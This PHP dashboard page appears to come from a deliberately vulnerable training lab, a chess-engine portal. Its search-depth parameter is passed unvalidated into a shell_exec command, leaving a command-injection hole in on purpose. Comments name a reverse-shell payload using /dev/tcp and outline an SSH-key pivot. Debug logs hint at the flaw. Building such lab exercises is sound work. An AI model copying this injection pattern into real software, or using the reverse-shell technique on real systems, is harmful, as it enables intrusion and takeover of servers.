<?php
require __DIR__ . "/auth.php";
require_login();                 // engine access is members-only
require __DIR__ . "/config.php";

$output = null;
$bestmove = "";
$fen_raw = "rnbqkbnr/pppppppp/8/8/8/8/PPPPPPPP/RNBQKBNR w KQkq - 0 1";
$depth = $default_depth;

if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $fen_raw = $_POST["fen"] ?? $fen_raw;

    // The FEN is passed safely as a single quoted argument...
    $fen = escapeshellarg($fen_raw);

    // ...the depth is "just a number", so we drop it in directly.
    $depth = $_POST["depth"] ?? $default_depth;

    // Wrap the engine call in `timeout` so a *blocking* injected payload (e.g. a
    // naive `; bash -i >& /dev/tcp/...` reverse shell) can only hold an Apache
    // worker for a bounded window: when the timeout fires, shell_exec() returns
    // and the portal recovers on its own. The intended foothold is brief anyway
    // -- grab the leaked SSH key and pivot in over SSH from your own box. A
    // student who wants a persistent shell can still detach it with setsid.
    // The injected command lives inside the `bash -c` string, so the timeout
    // covers the whole thing (not just the engine before the `;`).
    $inner = "$engine_path $fen $depth 2>&1";
    $cmd = "timeout " . intval($engine_timeout) . " bash -c " . escapeshellarg($inner);
    $output = shell_exec($cmd);

    if (preg_match('/bestmove\s+([a-h][1-8][a-h][1-8])/', (string)$output, $m)) {
        $bestmove = $m[1];
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Dashboard - GrandMaster Analysis Portal</title>
  <link rel="stylesheet" href="assets/style.css">
</head>
<body class="dashboard">
  <header>
    <div class="logo">&#9818; GrandMaster Analysis Portal</div>
    <nav>
      <a href="index.php">Home</a>
      <a href="about.php">About</a>
      <a href="dashboard.php">Dashboard</a>
      <a href="standings.php">Standings</a>
      <a href="logout.php">Logout</a>
    </nav>
  </header>

  <main>
    <section class="hero">
      <h1>Analysis dashboard</h1>
      <p>Signed in as <strong><?php echo htmlspecialchars($_SESSION["user"]); ?></strong>.</p>
    </section>

    <div class="layout board-focus">
      <section class="card board-card">
        <div id="board"></div>
        <p class="muted board-caption">
<?php if ($bestmove): ?>
          Analyzed position &mdash; best move <strong><?php echo htmlspecialchars($bestmove); ?></strong>
<?php else: ?>
          Live preview &mdash; edit the FEN to update the board.
<?php endif; ?>
        </p>
      </section>

      <section class="card form-card">
        <form method="post" action="dashboard.php">
          <label for="fen">FEN position</label>
          <input type="text" id="fen" name="fen" value="<?php echo htmlspecialchars($fen_raw); ?>">

          <label for="depth">Search depth</label>
          <input type="text" id="depth" name="depth" value="<?php echo htmlspecialchars((string)$depth); ?>">

          <button type="submit">Analyze position</button>
        </form>
<?php if ($output !== null): ?>
        <h2>Engine evaluation</h2>
        <p class="muted">Requested depth: <?php echo htmlspecialchars((string)$depth); ?></p>
        <pre class="evalbox"><?php echo htmlspecialchars((string)$output); ?></pre>
<?php endif; ?>
      </section>
    </div>
  </main>

  <footer>
    <p>&copy; 2024 GrandMaster Chess Club &mdash; chessmaster.local</p>
  </footer>

  <script src="assets/board.js"></script>
  <script>
    var fen = <?php echo json_encode($fen_raw); ?>;
    var best = <?php echo json_encode($bestmove); ?>;
    renderBoard("board", fen, uciToSquares(best));
    liveBoard("board", "fen");

    // ---- leftover debug from the 2024 migration (remove before launch) ----
    console.log("%c[GM-DEBUG]%c engine call: /opt/engine/analyze.sh '<fen>' <depth>",
                "color:#c9a35b;font-weight:bold", "color:inherit");
    console.log("[GM-DEBUG] depth is forwarded straight to the engine wrapper " +
                "(FIXME: validate before shell-out)");
    console.log("[GM-DEBUG] submitted depth =", <?php echo json_encode((string)$depth); ?>);
  </script>
</body>
</html>
